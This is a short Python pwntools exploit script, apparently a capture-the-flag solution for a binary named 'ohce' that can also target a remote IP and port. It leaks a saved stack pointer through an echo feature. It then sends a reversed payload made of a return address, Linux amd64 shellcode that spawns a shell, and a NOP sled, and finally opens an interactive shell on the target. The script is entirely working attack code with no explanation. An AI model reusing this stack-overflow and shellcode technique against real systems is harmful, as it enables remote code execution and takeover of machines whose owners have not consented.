from pwn import *

if args.REMOTE:
    io = remote('13.124.134.94', 8888)
else:
    io = process('./ohce')

def choice(nb):
    io.sendlineafter('>', str(nb))

def echo(msg):
    choice(1)
    io.sendline(msg)
    io.recvline()
    return io.recvline()

def echo_rev(msg):
    choice(2)
    io.sendline(msg)
    return io.recv()

def main():
    # Leak saved_rbp
    saved_rbp = unpack(echo('A' * 31).rstrip(), 'all')
    log.info('[saved_rbp] %#x' % (saved_rbp))


    payload = pack(saved_rbp - 0x140, 'all')[::-1]
    payload += asm(shellcraft.amd64.linux.sh(), arch='amd64')[::-1]
    payload += "\x90" * (0x32 * 5 - len(payload) + 5)

    # Save future RIP value
    echo(p64(saved_rbp - 0x60) * 100)

    # Send payload => future RIP + nopsled + shellcode
    echo_rev(payload)
    io.interactive()

if __name__ == '__main__':
    main()
